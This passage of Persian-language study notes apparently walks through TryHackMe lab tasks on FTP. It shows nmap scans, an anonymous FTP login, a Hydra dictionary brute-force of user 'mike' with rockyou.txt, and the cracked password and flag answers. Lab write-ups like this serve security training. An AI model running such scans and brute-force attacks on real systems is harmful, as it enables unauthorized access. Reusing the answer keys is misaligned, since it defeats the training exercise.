	4. حال به سرویس FTP در 10.10.223.220 با یوزر anonymous لاگین کردیم و میتوانیم تمام کامند های FTP را بر روی ماشین تارگت اجرا کنیم >>
		1. `ftp> ls`
		2. `ftp> get PUBLIC_NOTICE.txt`
		3. برای دانلود فایل از سرور FTP از کامند `get` استفاده میکنیم.
	5. حال فایل `PUBLIC_NOTICE.txt` در دایرکتوری `home/` دانلود شده است و میتوانیم آنرا باز کنیم.
	6. `cat ~/PUBLIC_NOTICE.txt`
5. Select Suitable Service's base on Scan Results for Initializing Exploit
	1. با اسکن هایی که انجام دادیم، بهترین سرویسی که میتوانیم از آن برای بهره برداری خود استفاده کنیم، سرویس `vsftpd 2.0.8` میباشد که در اینجا هم با استفاده از همین سرویس حمله خود را پیاده سازی میکنیم.
	2. همچنین با استفاده از `FTP Anonymous Login` توانستیم اطلاعاتی مانند Username و اطلاعات شخصی ماشین تارگت را بدست بیاوریم.
6. *TASK 9 Questions*
	1. *سوال اول*:
		1. What "variant" of FTP is running on it? `vsftp`
	2. *سوال دوم*:
		1. میگوید به سرور FTP درون 10.10.223.220 با یوزر anonymous لاگین کنید و سپس یک فایل درون سرور بنام `PUBLIC_NOTICE.txt` را دانلود کنید. در واقع نام این فایل پاسخ سوال دوم است.
			1. ![[Pasted image 20240713165540.png]]
	3. *سوال سوم*:
		1. میگوید بنظر شما نام اصلی Username این ماشین چیست؟ کافیست فایل `PUBLIC_NOTICE.txt` را باز کنید، این فایل یک نامه است که در زیر نامه یک نام `Mike` وجود دارد. این نام میتواند، نام اصلی یوزرنیم باشد.
			1. ![[Pasted image 20240713165737.png]]
	4. بر روی `Completed` کلیک کنید تا وارد TASK 10 FTP Exploitation شویم.
-----
```sh
sudo nmap -sS -A -T4 10.10.223.220
sudo nmap -sS 10.10.223.220
sudo nmap -p- 10.10.223.220

"FTP Anonymous Login"
ftp 10.10.223.220
Name(10.10.223.220:kali): anonymous
Password: #Leave it Blank
"Your now loging to ftp on 10.10.223.220"
ftp> ls
ftp> get PUBLIC_NOTICE.txt
ftp> exit
cd /home/kali/
cat PUBLIC_NOTICE.txt
```
##### TASK 10 - Exploitation FTP
0. *Task Description*
	1. در این مرحله هم باید با استفاده از سرویس آسیب پذیری که در ماشین تارگت در مرحله Enumeration کشف کردیم Exploitation خود را انجام دهیم. 
	2. در اینجا میخواهیم *password* یوزر *mike* را برای سرویس *FTP* در یک حمله *Bruteforce with Dictionary* بدست بیاوریم. این حمله را با ابزار `Hydra` و دیکشنری `Rockyou` انجام میدهیم.
1. *Initializing Attack*
	1. آماده سازی `rockyou.txt` و انجام حمله با استفاده از آن
	3. `hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.223.220 ftp -v`
	4. به محض شروع حمله و پیدا شدن پسورد یوزر mike، ابزار آنرا در صفحه ترمینال نمایش میدهد:
		1. ![[Pasted image 20240713171311.png]]
	5. حال میتوانیم با یوزر mike و پسورد password به FTP Server درون 10.10.223.220 لاگین کنیم.
		1. `ftp 10.10.223.220`
		2. `Name: mike`
		3. `Password: password`
			1. ![[Pasted image 20240713171636.png]]
		4. `ftp> ls`
	6. فایلی درون سرور بنام `ftp.txt` وجود دارد که باید برای جواب دادن سوال آنرا دانلود کنیم:
		1. `ftp> ls`
		2. `ftp> get ftp.txt`
			1. ![[Pasted image 20240713171859.png]]
		3. `ftp> exit`
	7. حال کافیست `ftp.txt` فایل را باز کنیم و مقدار فلگ، که جواب سوال سوم است را کپی کنیم:
		1. `cat ~/ftp.txt`
			1. ![[Pasted image 20240713172027.png]]
2. *TASK 10 Q_&_A*
	1. *سوال اول* پسورد یوزرنیم Mike چیست؟ `password`
	2. *سوال دوم* فقط کافیست با یوزر نیم Mike به FTP Server درون ماشین تارگت متصل شویم. سپس بر روی `Completed` کلیک میکنیم.
	3. *سوال سوم* فایل `ftp.txt` را از FTP Server درون 10.10.223.220 دانلود کنید، سپس آنرا باز کنید، کافیست مقدار فلگ را کپی و در جواب این سوال paste کنیم. `THM{y0o_g0t_th3_ftp_fl4g}`
		1. ![[Pasted image 20240713172353.png]]
----
```sh
hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.223.220 ftp -v
ftp 10.10.223.220
Name(10.10.223.220:kali): mike
Password: password
ftp> ls
ftp> get ftp.txt
ftp> exit
cat ~/ftp.txt #Copy flag value => THM{y0o_g0t_th3_ftp_fl4g
```
### !